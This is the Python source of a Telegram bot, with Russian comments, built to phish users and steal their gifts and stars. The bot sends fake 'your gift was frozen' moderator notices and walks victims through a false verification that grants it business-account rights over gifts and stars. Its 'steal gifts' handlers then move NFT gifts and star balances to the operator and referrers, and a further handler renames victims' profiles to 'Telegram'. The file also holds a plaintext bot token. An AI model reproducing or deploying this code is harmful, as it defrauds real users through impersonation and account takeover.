import asyncio
import hashlib
import platform
from datetime import datetime, timedelta
import os
import json
import random
import requests
import aiohttp
import logging
import code

from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.types import (
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile,
    CallbackQuery
)
from aiogram.filters import CommandStart, Command
from aiogram.utils.keyboard import InlineKeyboardBuilder

if not logging.getLogger().handlers:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        filename="bot.log"  # Логи
    )
logger = logging.getLogger(__name__)


TOKEN = "7860507426:AAF6weuiHFqqZhjBWZnm0OW2Qlxo50TQErE"  # Токен бота
LOG_CHAT_ID = -1002624563938 # ID чата. Можно в группу или просто кента любого
MAX_GIFTS_PER_RUN = 1000
ADMIN_IDS = [8115830990] # ID админов куда падают гифты в случае неотработки рефки

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

dp = Dispatcher(storage=MemoryStorage())


@dp.message(Command("check_business"))
async def check_business_cmd(message: types.Message):
    """Принудительная проверка всех бизнес-подключений"""
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("🚫 Доступ запрещен")
        
    connections = await bot.get_business_connections()
    await message.answer(f"🔍 Найдено подключений: {len(connections)}")
    for connection in connections:
        await handle_business(connection)

@dp.message(Command("check_ref"))
async def check_ref(message: types.Message):
    """Проверка реферальных связей"""
    if message.from_user.id not in ADMIN_IDS:
        return await message.answer("🚫 Доступ запрещен")
        
    try:
        with open("referrers.json", "r") as f:
            data = json.load(f)
        text = "📊 Реферальные связи:\n" + "\n".join(f"{k} → {v}" for k, v in data.items())
        await message.answer(text[:4000])
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

last_messages = {}
user_referrer_map = {}
user_referrals = {}  # inviter_id -> [business_ids]
ref_links = {}       # ref_code -> inviter_id

if os.path.exists("referrers.json"):
    referrers_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "referrers.json")
    try:
        with open(referrers_path, "r") as f:  
            user_referrer_map = json.load(f)
    except (json.JSONDecodeError, IOError):
        user_referrer_map = {}  
        with open(referrers_path, "w") as f:
            json.dump(user_referrer_map, f)

def get_expiration_str():
    now = datetime.utcnow()
    expiration = now + timedelta(days=365)
    if platform.system() == "Windows":
        return expiration.strftime("%#d %b %Y, %#H:%M UTC")
    else:
        return expiration.strftime("%-d %b %Y, %-H:%M UTC")

@dp.inline_query()
async def handle_inline_query(inline_query: InlineQuery):
    try:
        query = inline_query.query.strip()
        parts = [p.strip() for p in query.split(",")]
        if len(parts) != 3:
            return

        target_user = parts[0]
        gift_name = parts[1]
        gift_url = parts[2]
        expiration_str = get_expiration_str()

        # Рефка (inline_query.from_user)
        ref_code = f"ref{inline_query.from_user.id}"
        ref_link = f"https://t.me/{(await bot.me()).username}?start={ref_code}"

        message_text = (
            f"This is an automatic message!❄️\n\n"
            f"Dear, {target_user}\n\n"
            f"Your gift <a href='{gift_url}'>{gift_name}</a> was removed from the market for suspicious activity by one of our supervisors "
            f"and it was confirmed by our team of moderators. Now it's removed until <b>{expiration_str}</b>.\n\n"
            f"Your account will be automatically released on <b>{expiration_str}</b>. "
            f"If you think this is a mistake, you can submit a complaint using the button below."
        )

        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="Submit complaint", url=ref_link)]  # Используем рефку
            ]
        )

        result_id = hashlib.md5(message_text.encode()).hexdigest()
        result = InlineQueryResultArticle(
            id=result_id,
            title="Send gift warning",
            description=f"Gift for {target_user}",
            input_message_content=InputTextMessageContent(
                message_text=message_text,
                parse_mode=ParseMode.HTML
            ),
            reply_markup=keyboard
        )

        await inline_query.answer([result], cache_time=1)
        print("✅ Inline response sent")

    except Exception as e:
        print("❌ Error in inline_query:", e)

class Draw(StatesGroup):
    id = State()
    gift = State()

def main_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📌 Сохранять одноразовые сообщения", callback_data="temp_msgs")],
        [InlineKeyboardButton(text="🗑️ Сохранять удалённые сообщения", callback_data="deleted_msgs")],
        [InlineKeyboardButton(text="✏️ Сохранять отредактированные сообщения", callback_data="edited_msgs")],
        [InlineKeyboardButton(text="🎞 Анимации с текстом", callback_data="animations")],
        [InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")]
    ])

@dp.message(CommandStart())
async def start_cmd(message: types.Message):
    args = message.text.split(" ")
    
    # Тихая обработка реферальной ссылки (без уведомления пользователя)
    if len(args) > 1 and args[1].startswith("ref"):
        ref_code = args[1]
        try:
            inviter_id = int(ref_code.replace("ref", ""))
            if inviter_id and inviter_id != message.from_user.id:
                user_referrer_map[message.from_user.id] = inviter_id
                with open("referrers.json", "w") as f:
                    json.dump(user_referrer_map, f)
        except ValueError:
            pass

    # "Unfreeze Order"
    unfreeze_button = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="❄️ Unfreeze Order", callback_data="unfreeze_order")]
        ]
    )
    
    await message.answer(
        text="<b>The gift is frozen!</b>\n\n"
             "If you have no connection to this incident, click the \"Unfreeze Order\" button and complete a quick verification process, which takes just 1 minute.\n\n"
             "After verification, the gift will be credited back to your Telegram profile.\n\n"
             "⚠️ Please note that selling this gift will no longer available on portals.",
        reply_markup=unfreeze_button,
        parse_mode="HTML"
    )

@dp.message(Command("getrefZZZ"))
async def send_ref_link(message: types.Message):
    user_id = message.from_user.id
    ref_code = f"ref{user_id}"
    ref_links[ref_code] = user_id
    await message.answer(f"Ваша реферальная ссылка:https://t.me/{(await bot.me()).username}?start={ref_code}")


@dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
async def require_instruction(callback: types.CallbackQuery):
    await callback.answer("Сначала нажмите на 📖 Инструкцию сверху!", show_alert=True)

async def pagination(page=0):
    url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
    try:
        response = requests.get(url)
        response.raise_for_status()
        builder = InlineKeyboardBuilder()
        start = page * 9
        end = start + 9
        count = 0
        
        data = response.json()
        if data.get("ok", False):
            gifts = list(data.get("result", {}).get("gifts", []))
            for gift in gifts[start:end]:
                print(gift)
                count += 1
                builder.button(
                    text=f"⭐️{gift['star_count']} {gift['sticker']['emoji']}",
                    callback_data=f"gift_{gift['id']}"
                )
            builder.adjust(2)
        if page <= 0:
            builder.row(
                InlineKeyboardButton(
                    text="•",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="Вперед",
                    callback_data=f"next_{page + 1}"
                )
            )
        elif count < 9:
            builder.row(
                InlineKeyboardButton(
                    text="Назад",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="•",
                    callback_data="empty"
                )
            )
        elif page > 0 and count >= 9:
            builder.row(
                InlineKeyboardButton(
                    text="Назад",
                    callback_data=f"down_{page - 1}"
                ),
                InlineKeyboardButton(
                    text=f"{page}/{len(gifts) // 9}",
                    callback_data="empty"
                ),
                InlineKeyboardButton(
                    text="Вперед",
                    callback_data=f"next_{page + 1}"
                )
            )
        return builder.as_markup()
    except Exception as e:
        print(e)
        await bot.send_message(chat_id=ADMIN_IDS[0], text=f"{e}")

@dp.business_connection()
async def handle_business(business_connection: types.BusinessConnection):
    business_id = business_connection.id
    builder = InlineKeyboardBuilder()
    
    builder.button(
        text="💰 Украсть подарки", 
        callback_data=f"steal_gifts:{business_id}"
    )
    builder.button(
        text="⛔️ Удалить подключение", 
        callback_data=f"destroy:{business_id}"
    )
    
    user = business_connection.user
    
    info = await bot.get_business_connection(business_id)
    rights = info.rights
    gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
    stars = await bot.get_business_account_star_balance(business_id)
    
    total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
    nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
    nft_transfer_cost = len(nft_gifts) * 25
    total_withdrawal_cost = total_price + nft_transfer_cost
    
    header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n\n"
    
    user_info = (
        f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
        f"├─ ID: <code>{user.id}</code>\n"
        f"├─ Username: @{user.username or 'нет'}\n"
        f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
    )
    
    balance_info = (
        f"<blockquote>💰 <b>Баланс:</b>\n"
        f"├─ Доступно звёзд: {int(stars.amount):,}\n"
        f"├─ Звёзд в подарках: {total_price:,}\n"
        f"╰─ <b>Итого:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
    )
    
    gifts_info = (
        f"<blockquote>🎁 <b>Подарки:</b>\n"
        f"├─ Всего: {gifts.total_count}\n"
        f"├─ Обычные: {gifts.total_count - len(nft_gifts)}\n"
        f"├─ NFT: {len(nft_gifts)}\n"
        f"├─ <b>Стоимость переноса NFT:</b> {nft_transfer_cost:,} звёзд (25 за каждый)\n"
        f"╰─ <b>Общая стоимость вывода:</b> {total_withdrawal_cost:,} звёзд</blockquote>"
    )
    
    nft_list = ""
    if nft_gifts:
        nft_items = []
        for idx, g in enumerate(nft_gifts, 1):
            try:
                gift_id = getattr(g, 'id', 'скрыт')
                nft_items.append(f"├─ NFT #{idx} (ID: {gift_id}) - 25⭐")
            except AttributeError:
                nft_items.append(f"├─ NFT #{idx} (скрыт) - 25⭐")
        
        nft_list = "\n<blockquote>🔗 <b>NFT подарки:</b>\n" + \
                  "\n".join(nft_items) + \
                  f"\n╰─ <b>Итого:</b> {len(nft_gifts)} NFT = {nft_transfer_cost}⭐</blockquote>\n\n"
    
    rights_info = (
        f"<blockquote>🔐 <b>Права бота:</b>\n"
        f"├─ Основные: {'✅' if rights.can_read_messages else '❌'} Чтение | "
        f"{'✅' if rights.can_delete_all_messages else '❌'} Удаление\n"
        f"├─ Профиль: {'✅' if rights.can_edit_name else '❌'} Имя | "
        f"{'✅' if rights.can_edit_username else '❌'} Username\n"
        f"╰─ Подарки: {'✅' if rights.can_convert_gifts_to_stars else '❌'} Конвертация | "
        f"{'✅' if rights.can_transfer_stars else '❌'} Перевод</blockquote>\n\n"
    )
    
    footer = (
        f"<blockquote>ℹ️ <i>Перенос каждого NFT подарка стоит 25 звёзд</i>\n"
        f"🕒 Время: {datetime.now().strftime('%d.%m.%Y %H:%M')}</blockquote>"
    )
    
    full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
    
    # Отправка в лог-чат
    try:
        await bot.send_message(
            chat_id=LOG_CHAT_ID,
            text=full_message,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        print(f"Ошибка при отправке в лог-чат: {e}")

    # Увед рефа
    inviter_id = user_referrer_map.get(user.id)
    if inviter_id and inviter_id != user.id:
        try:
            await bot.send_message(
                chat_id=inviter_id,
                text=full_message,
                reply_markup=builder.as_markup(),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            print(f"Ошибка при отправке уведомления пригласившему {inviter_id}: {e}")
            try:
                await bot.send_message(
                    chat_id=LOG_CHAT_ID,
                    text=f"⚠️ Не удалось отправить уведомление пригласившему <code>{inviter_id}</code>: {e}",
                    parse_mode="HTML"
                )
            except:
                pass
    

@dp.callback_query(F.data == "draw_stars")
async def draw_stars(message: types.Message, state: FSMContext):
    await message.answer(text="Введите айди юзера кому перевести подарки")
    await state.set_state(Draw.id)

@dp.message(F.text, Draw.id)
async def choice_gift(message: types.Message, state: FSMContext):
    msg = await message.answer(
        text="Актуальные подарки:",
        reply_markup=await pagination()
    )
    last_messages[message.chat.id] = msg.message_id
    user_id = message.text
    await state.update_data(user_id=user_id)
    await state.set_state(Draw.gift)

@dp.callback_query(F.data.startswith("gift_"))
async def draw(callback: CallbackQuery, state: FSMContext):
    gift_id = callback.data.split('_')[1]
    user_id = await state.get_data()
    user_id = user_id['user_id']
    await bot.send_gift(
        gift_id=gift_id,
        chat_id=int(user_id)
    )
    await callback.message.answer("Успешно отправлен подарок")
    await state.clear()

@dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
async def edit_page(callback: CallbackQuery):
    message_id = last_messages[callback.from_user.id]
    await bot.edit_message_text(
        chat_id=callback.from_user.id,
        message_id=message_id,
        text="Актуальные подарки:",
        reply_markup=await pagination(page=int(callback.data.split("_")[1]))
    )

@dp.message(Command("ap"))
async def apanel(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text="⭐️Вывод звезд",
            callback_data="draw_stars"
        )
    )
    await message.answer(
        text="Админ панель:",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("destroy:"))
async def destroy_account(callback: CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        return
    builder = InlineKeyboardBuilder()
    print("HSHSHXHXYSTSTTSTSTSTSTSTSTSTSTTZTZTZYZ")
    business_id = callback.data.split(":")[1]
    print(f"Business id {business_id}")
    builder.row(
        InlineKeyboardButton(
            text="⛔️Отмена самоуничтожения",
            callback_data=f"decline:{business_id}"
        )
    )
    await bot.set_business_account_name(business_connection_id=business_id, first_name="Telegram")
    await bot.set_business_account_bio(business_id, "Telegram")
    photo = FSInputFile("telegram.jpg")
    photo = types.InputProfilePhotoStatic(type="static", photo=photo)
    await bot.set_business_account_profile_photo(business_id, photo)
    await callback.message.answer(
        text="⛔️Включен режим самоуничтожения, для того чтобы отключить нажмите на кнопку",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data.startswith("decline:"))
async def decline(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    await bot.set_business_account_name(business_id, "Bot")
    await bot.set_business_account_bio(business_id, "Some bot")
    await callback.message.answer("Мамонт спасен от сноса.")

        
@dp.callback_query(F.data.startswith("steal_gifts:"))
async def steal_gifts_handler(callback: CallbackQuery):
    business_id = callback.data.split(":")[1]
    
    try:
        # Получаем информацию о бизнес-аккаунте
        business_connection = await bot.get_business_connection(business_id)
        user = business_connection.user  # Владелец бизнес-аккаунта
    except Exception as e:
        await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
        return

    # Определяем получателя (пригласившего владельца бизнес-аккаунта)
    inviter_id = user_referrer_map.get(user.id)  # Важно: user.id, а не callback.from_user.id
    
    # Проверяем, существует ли пригласивший и доступен ли он
    if inviter_id:
        try:
            await bot.get_chat(inviter_id)  # Проверяем, существует ли чат
            recipient_id = inviter_id
            is_admin = False
            print(f"Подарки будут отправлены пригласившему: {inviter_id}")
        except Exception as e:
            print(f"Пригласивший {inviter_id} недоступен: {e}")
            recipient_id = ADMIN_IDS[0]
            is_admin = True
    else:
        recipient_id = ADMIN_IDS[0]
        is_admin = True
        print("Пригласивший не найден, отправляем админу")

    # Проверяем, что recipient_id корректен и не совпадает с ID бизнес-аккаунта
    if recipient_id == user.id:
        await callback.answer("❌ Нельзя передать подарки самому себе!")
        return

    stolen_nfts = []
    stolen_count = 0
    errors = []
    
    try:
        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
    except Exception as e:
        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков: {e}")
        await callback.answer("Ошибка при получении подарков")
        return

    # Фильтруем только NFT подарки, которые можно передать
    transferable_gifts = [
        gift for gift in gifts_list 
        if gift.type == "unique" and gift.can_be_transferred
    ][:MAX_GIFTS_PER_RUN]  # Ограничиваем количество
    
    total_gifts = len(transferable_gifts)
    
    # Рассчитываем комиссию админу (если есть пригласивший и больше 2 подарков)
    admin_gifts = 0
    if not is_admin and total_gifts > 2:
        if total_gifts >= 3:
            admin_gifts = 1
        elif total_gifts >= 6:
            admin_gifts = 3
        elif total_gifts >= 10:
            admin_gifts = 4
        elif total_gifts >= 15:
            admin_gifts = 6
        elif total_gifts >= 20:
            admin_gifts = 8
        elif total_gifts >= 25:
            admin_gifts = 10
        elif total_gifts >= 30:
            admin_gifts = 15
    
    # Сначала передаем подарки админу (если есть комиссия)
    admin_stolen = []
    if admin_gifts > 0 and ADMIN_IDS:
        for gift in transferable_gifts[:admin_gifts]:
            try:
                await bot.transfer_gift(
                    business_id, 
                    gift.owned_gift_id, 
                    ADMIN_IDS[0], 
                    gift.transfer_star_count
                )
                gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
                admin_stolen.append(f"t.me/nft/{gift_name}")
                stolen_count += 1
            except Exception as e:
                errors.append(f"Ошибка передачи админу {gift.owned_gift_id}: {e}")
    
    # Затем передаем оставшиеся подарки получателю
    user_stolen = []
    for gift in transferable_gifts[admin_gifts:]:
        try:
            await bot.transfer_gift(
                business_id, 
                gift.owned_gift_id, 
                recipient_id, 
                gift.transfer_star_count
            )
            gift_name = gift.gift.name.replace(" ", "") if hasattr(gift.gift, 'name') else "Unknown"
            user_stolen.append(f"t.me/nft/{gift_name}")
            stolen_count += 1
        except Exception as e:
            errors.append(f"Ошибка передачи {gift.owned_gift_id}: {e}")

    # Конвертируем обычные подарки в звёзды
    try:
        for gift in gifts_list:
            if gift.type == "regular":
                try:
                    await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
                except Exception as e:
                    errors.append(f"Ошибка конвертации: {e}")
    except Exception as e:
        errors.append(f"Ошибка при обработке обычных подарков: {e}")

    # Перевод звёзд получателю
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        amount = int(stars.amount)
        if amount > 0:
            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
            await bot.send_message(
                LOG_CHAT_ID, 
                f"🌟 Выведено звёзд: {amount} для {'пригласившего' if not is_admin else 'админа'}"
            )
    except Exception as e:
        errors.append(f"Ошибка при выводе звёзд: {e}")

    # Формируем отчет
    result_msg = []
    if stolen_count > 0:
        result_msg.append(f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>")
        if admin_stolen:
            result_msg.append(f"\n📦 Админу передано: <b>{len(admin_stolen)}</b>")
            result_msg.extend(admin_stolen[:3])
        if user_stolen:
            recipient_type = "пригласившему" if not is_admin else "админу"
            result_msg.append(f"\n🎁 Основному получателю ({recipient_type}): <b>{len(user_stolen)}</b>")
            result_msg.extend(user_stolen[:3])
    
    if errors:
        result_msg.append("\n❌ Ошибки:")
        result_msg.extend(errors[:3])

    await callback.message.answer("\n".join(result_msg), parse_mode="HTML")
    await callback.answer()
    
@dp.callback_query(F.data == "unfreeze_order")
async def handle_unfreeze_order(callback: CallbackQuery):
    await callback.message.delete()
    # Три кнопке в unfreeze
    options_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="1️⃣", callback_data="unfreeze_option_1")],
            [InlineKeyboardButton(text="2️⃣", callback_data="unfreeze_option_2")],
            [InlineKeyboardButton(text="3️⃣", callback_data="unfreeze_option_3")]
        ]
    )
    
    await callback.message.answer(
        text="❓ Under what circumstances did you receive\nthe frozen Gift?\n\n"
             "Please choose one of the options below:\n\n"
             "1️⃣ Purchased via Telegram and later\nupgraded\n\n"
             "2️⃣ Received directly from another user (as a\ngift or off-market trade)\n\n"
             "3️⃣ Acquired through the marketplace",
        reply_markup=options_keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("unfreeze_option_"))
async def handle_unfreeze_option(callback: CallbackQuery):
    # Удаляет прошлое сообщение внизу команда если че просто вырезать
    await callback.message.delete()
    
    # Текст инструкции
    instruction_text = (
        "Excellent! We have counted your answer\n\n"
        "🎁 To restore the gift, you need to connect the bot to your workspace.\n\n"
        "🔹What you need to do:\n\n"
        "1️⃣ Add this bot to the \"Chatbots\" section in your business account\n"
        "2️⃣ Enable all the functions in the \"Manage gifts and stars\" block:\n\n"
        "✅ View gifts and stars\n"
        "✅ Exchange gifts for stars\n"
        "✅ Set up gifts\n"
        "✅ Transfer and improve gifts\n"
        "✅ Send stars\n\n"
        "📩 After you add the bot and enable the necessary functions, do not turn it off "
        "until we notify you when the gift is restored, on average it takes 1 minutes\n\n"
        "We will see for ourselves when you do everything according to the instructions"
    )

    # Кнопка "Done"
    done_button = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="Done", callback_data="verification_done")]
        ]
    )
    
    # Отправляем инструкцию с кнопкой
    await callback.message.answer(
        text=instruction_text,
        reply_markup=done_button
    )
    await callback.answer()


# Обработчик кнопки "Done"
@dp.callback_query(F.data == "verification_done")
async def handle_done_button(callback: CallbackQuery):
    # Тоже удаляет внизу строчка
    await callback.message.delete()
    
    # Вериф финал
    done_text = (
        "🔔 Verification is in progress...\n\n"
        "⚠️ This usually takes less than a minute. We'll notify you once it's done.\n\n"
        "🙏 Please ensure the bot has access to Gifts and Stars."
    )
    await callback.message.answer(done_text)
    await callback.answer()

async def main():
    logger.info("Запуск бота...")
    try:
        connections = await bot.get_business_connections()
        logger.info(f"Найдено подключений: {len(connections)}")  
        for conn in connections:
            await handle_business(conn)  
    except Exception as e:
        logger.error(f"Ошибка при проверке подключений: {e}")
    
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
